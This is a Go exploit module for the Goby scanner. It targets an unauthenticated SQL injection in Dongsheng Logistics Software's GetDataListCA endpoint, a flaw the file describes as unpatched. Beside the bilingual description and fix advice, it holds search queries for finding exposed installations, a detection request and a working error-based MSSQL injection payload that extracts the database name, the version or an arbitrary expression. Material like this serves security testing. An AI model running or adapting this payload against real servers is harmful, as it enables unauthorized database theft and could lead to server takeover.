package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "Dongsheng Logistics Software /MvcShipping/MsCwGenlegAccitems/GetDataListCA SQL Injection Vulnerability",
    "Description": "<p>Dongsheng Logistics Software is a logistics management software developed by Qingdao Dongsheng Weiye Software Co., Ltd., which integrates various functions such as order management, warehouse management, and transportation management. The company was founded in November 2004 (formerly known as Qingdao Jinghong Logistics Information Technology Co., Ltd.), focusing on products and services related to shipping and logistics. The freight forwarding version of Dongsheng Logistics Information Management System adopts MS-SQLserver large database, combined with B/S+C/S program architecture, with simple, rigorous, flexible process and powerful functions. Has a good reputation and wide coverage.Dongsheng Logistics software has a SQL injection vulnerability in the dDataListCA interface. Unauthenticated remote attackers can not only exploit the SQL injection vulnerability to obtain information from the database (such as administrator backend passwords, site user personal information), but also write trojans to the server in high privilege situations, further obtaining server system privileges</p>",
    "Product": "Qingdao Dongsheng Weiye Software",
    "Homepage": "http://www.dongshengsoft.com/",
    "DisclosureDate": "2024-11-13",
    "PostTime": "2024-11-27",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "(body=\"FeeCodes/CompanysAdapter.aspx\" || body=\"dhtmlxcombo_whp.js\" || body=\"dongshengsoft\" || body=\"theme/dhtmlxcombo.css\") && body=\"东胜\"",
    "GobyQuery": "(body=\"FeeCodes/CompanysAdapter.aspx\" || body=\"dhtmlxcombo_whp.js\" || body=\"dongshengsoft\" || body=\"theme/dhtmlxcombo.css\") && body=\"东胜\"",
    "Level": "1",
    "Impact": "<p>Attackers can access sensitive information in the database, such as user passwords, bank accounts, etc., leading to the leakage of user privacy.</p>",
    "Recommendation": "<p>1. Strictly verify and filter user input to ensure the legitimacy and security of input data. </p><p> 2. Close the Internet exposure or upgrade the access rights of the interface settings to the security version. </p><p> 3. The manufacturer has not yet released the latest version, please follow the official website <a href=\"http://www.dongshengsoft.com/\">http://www.dongshengsoft.com/</a></p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/143724816?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "@@version",
            "show": "attackType=custom"
        },
        {
            "name": "default",
            "type": "select",
            "value": "DB_NAME(),@@version",
            "show": "attackType=default"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/MvcShipping/MsCwGenlegAccitems/GetDataListCA?PACCGID={{{rand4_url}}}",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate, br"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{{{rand4_md5}}}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/MvcShipping/MsCwGenlegAccitems/GetDataListCA?PACCGID={{{payload_default_url}}}",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate, br"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|qqxvq(.*?)1qbjjq",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "东胜物流软件 /MvcShipping/MsCwGenlegAccitems/GetDataListCA SQL 注入漏洞",
            "Product": "青岛东胜伟业软件",
            "Description": "<p>东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。该公司初创于2004年11月（前身为青岛景宏物流信息技术有限公司），专注于航运物流相关环节的产品和服务。东胜物流信息管理系统货代版采用MS-SQLserver大型数据库，结合B/S+C/S的程序架构，流程简捷、严密、灵活，功能强大。具有良好的口碑和广泛的覆盖率。<br>东胜物流软件 GetDataListCA&nbsp; 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用&nbsp;SQL&nbsp;注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限<br></p>",
            "Recommendation": "<p>1、对用户输入进行严格的验证和过滤，确保输入数据的合法性和安全性。</p><p>2、关闭互联网暴露面或接口设置访问权限升级至安全版本。</p><p>3、该厂商还未发布最新版本，关注官网 <a href=\"http://www.dongshengsoft.com/\">http://www.dongshengsoft.com/</a></p>",
            "Impact": "<p>攻击者可以读取数据库中的敏感信息，如用户密码、银行账户等，导致用户隐私泄露。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Dongsheng Logistics Software /MvcShipping/MsCwGenlegAccitems/GetDataListCA SQL Injection Vulnerability",
            "Product": "Qingdao Dongsheng Weiye Software",
            "Description": "<p>Dongsheng Logistics Software is a logistics management software developed by Qingdao Dongsheng Weiye Software Co., Ltd., which integrates various functions such as order management, warehouse management, and transportation management. The company was founded in November 2004 (formerly known as Qingdao Jinghong Logistics Information Technology Co., Ltd.), focusing on products and services related to shipping and logistics. The freight forwarding version of Dongsheng Logistics Information Management System adopts MS-SQLserver large database, combined with B/S+C/S program architecture, with simple, rigorous, flexible process and powerful functions. Has a good reputation and wide coverage.Dongsheng Logistics software has a SQL injection vulnerability in the dDataListCA interface. Unauthenticated remote attackers can not only exploit the SQL injection vulnerability to obtain information from the database (such as administrator backend passwords, site user personal information), but also write trojans to the server in high privilege situations, further obtaining server system privileges<br></p>",
            "Recommendation": "<p>1. Strictly verify and filter user input to ensure the legitimacy and security of input data.&nbsp;</p><p>&nbsp;2. Close the Internet exposure or upgrade the access rights of the interface settings to the security version.&nbsp;</p><p>&nbsp;3. The manufacturer has not yet released the latest version, please follow the official website <a href=\"http://www.dongshengsoft.com/\">http://www.dongshengsoft.com/</a><br></p>",
            "Impact": "<p>Attackers can access sensitive information in the database, such as user passwords, bank accounts, etc., leading to the leakage of user privacy.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "payload_default_url": "define|query_encode|1') AND 6782 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(120)+CHAR(118)+CHAR(113)+{{{payload}}}+(SELECT (CASE WHEN (6782=6782) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(106)+CHAR(106)+CHAR(113))) -- OevW",
        "rand4": "define|variable|{{{rand|int|4}}}",
        "rand4_md5": "define|md5|{{{rand4}}}",
        "rand4_url": "define|query_encode|1') AND 6782 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(120)+CHAR(118)+CHAR(113)+LOWER(CONVERT(VARCHAR(32), HASHBYTES('MD5', '{{{rand4}}}'), 2))+(SELECT (CASE WHEN (6782=6782) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(106)+CHAR(106)+CHAR(113)))-- OevW"
    },
    "EditType": "fast",
    "VariablesOrder": [
        "payload",
        "payload_default_url",
        "rand4",
        "rand4_md5",
        "rand4_url"
    ],
    "PocId": "9974"
}`
  
    ExpManager.AddExploit(NewExploit(
      goutils.GetFileName(),
      expJson,
      nil,
      nil,
    ))
  }